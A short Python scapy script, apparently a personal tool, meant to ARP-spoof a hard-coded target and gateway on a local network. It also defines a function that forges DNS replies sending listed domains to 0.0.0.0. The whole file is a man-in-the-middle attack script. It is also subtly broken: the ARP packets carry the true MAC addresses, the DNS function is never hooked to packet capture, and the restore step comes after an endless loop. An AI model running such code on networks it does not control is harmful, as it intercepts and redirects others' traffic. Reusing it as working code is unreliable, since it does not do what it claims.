import scapy.all as scapy
import time

# Configuration
interval = 4
target_ip = "192.168.68.117"  # Enter your target IP
gateway_ip = "192.168.68.1"  # Enter your gateway's IP
blocked_domains = ["www.ynet.co.il", "test.com"]  # Enter the domains to block

# Function to perform ARP spoofing
def spoof_arp(target_ip, gateway_ip):
    target_mac = scapy.getmacbyip(target_ip)
    gateway_mac = scapy.getmacbyip(gateway_ip)
    packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.send(packet1, verbose=False)
    scapy.send(packet2, verbose=False)
    print(f"[+] ARP spoofing: {gateway_ip} is at {gateway_mac}, {target_ip} is at {target_mac}")

# Function to perform DNS spoofing
def spoof_dns(pkt):
    if pkt.haslayer(scapy.DNSQR) and pkt[scapy.DNS].qr == 0:
        queried_domain = pkt[scapy.DNSQR].qname.decode().strip(".")
        if queried_domain in blocked_domains:
            spoofed_ip = "0.0.0.0"  # IP to which the domain will be spoofed (e.g., localhost)
            spoofed_pkt = scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst)/ \
                          scapy.UDP(dport=pkt[scapy.UDP].sport, sport=pkt[scapy.UDP].dport)/ \
                          scapy.DNS(id=pkt[scapy.DNS].id, qr=1, aa=1, qd=pkt[scapy.DNS].qd,
                                    an=scapy.DNSRR(rrname=pkt[scapy.DNSQR].qname, ttl=10, rdata=spoofed_ip))
            scapy.send(spoofed_pkt, verbose=False)
            print(f"[+] Spoofed DNS response: {queried_domain} -> {spoofed_ip}")

try:
    print("[+] Starting ARP spoofing...")
    while True:
        # Perform ARP spoofing between target and gateway
        spoof_arp(target_ip, gateway_ip)
        time.sleep(interval)
except KeyboardInterrupt:
    print("[+] Interrupt detected, stopping ARP spoofing...")


# Function to restore ARP tables
def restore_arp(target_ip, gateway_ip):
    target_mac = scapy.getmacbyip(target_ip)
    gateway_mac = scapy.getmacbyip(gateway_ip)
    packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.send(packet1, verbose=False)
    scapy.send(packet2, verbose=False)
    print(f"[+] Restored ARP tables: {target_ip} is at {target_mac}, {gateway_ip} is at {gateway_mac}")

# Restore ARP tables
restore_arp(target_ip, gateway_ip)
print("[+] ARP tables restored")